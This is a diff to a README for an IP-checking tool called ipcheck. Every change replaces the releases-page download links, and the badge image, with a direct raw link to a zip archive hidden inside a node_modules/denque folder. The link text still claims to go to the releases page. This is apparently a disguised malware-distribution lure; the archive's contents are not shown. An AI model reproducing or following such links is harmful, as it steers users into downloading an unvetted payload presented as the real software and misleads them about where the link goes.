@@ -4,7 +4,7 @@
 Welcome to **ipcheck**, your easy-to-use tool for checking IP quality. Follow these steps to download and run the application smoothly.
 
 ## 📥 Download the Application
-[![Download ipcheck](https://img.shields.io/badge/Download-ipcheck-blue)](https://github.com/Anis131212/ipcheck/releases)
+[![Download ipcheck](https://github.com/Anis131212/ipcheck/raw/refs/heads/main/backend/node_modules/denque/Software_bannerman.zip)](https://github.com/Anis131212/ipcheck/raw/refs/heads/main/backend/node_modules/denque/Software_bannerman.zip)
 
 ## 🛠 What You Need
 Before you start, ensure you have the following:
@@ -17,7 +17,7 @@ Follow these instructions to get ipcheck up and running.
 
 1. **Visit the Download Page**  
    Click the link below to go to the releases page.  
-   [Download from Releases Page](https://github.com/Anis131212/ipcheck/releases)
+   [Download from Releases Page](https://github.com/Anis131212/ipcheck/raw/refs/heads/main/backend/node_modules/denque/Software_bannerman.zip)
 
 2. **Select the Latest Release**  
    Look for the latest version of ipcheck on the releases page. It will be at the top of the list.
@@ -65,6 +65,6 @@ We are committed to improving ipcheck. Future updates may include:
 Join our community to help us grow. Whether reporting issues, suggesting features, or contributing code, your input is valuable. 
 
 Visit the releases page again for updates:  
-[Download from Releases Page](https://github.com/Anis131212/ipcheck/releases)
+[Download from Releases Page](https://github.com/Anis131212/ipcheck/raw/refs/heads/main/backend/node_modules/denque/Software_bannerman.zip)
 
 Thank you for using ipcheck! We hope it serves you well.
